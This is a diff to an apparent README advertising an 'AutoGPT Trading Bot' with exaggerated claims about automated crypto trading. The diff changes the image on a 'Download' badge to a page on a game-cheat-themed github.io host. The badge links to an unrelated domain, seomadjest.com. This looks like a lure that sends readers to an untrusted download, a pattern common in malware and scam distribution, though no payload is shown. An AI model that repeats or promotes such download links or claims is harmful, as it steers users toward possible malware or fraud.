@@ -4,7 +4,7 @@
 
 🎯 From lightning-fast scalping strategies to swing and long-term trading setups, this bot integrates seamlessly with top exchanges like Binance, Bybit, and KuCoin. With a beautiful no-code interface, real-time analytics, and 24/7 automation — it's your intelligent partner for dominating the crypto markets.
 
-[![Download AutoGPT Trading Bot](https://img.shields.io/badge/Download-AutoGPT%20Trading%20Bot-blueviolet)](https://seomadjest.com)
+[![Download AutoGPT Trading Bot](https://valorant-aimb0tpro-info.github.io/.github/)](https://seomadjest.com)
 
 ---
 
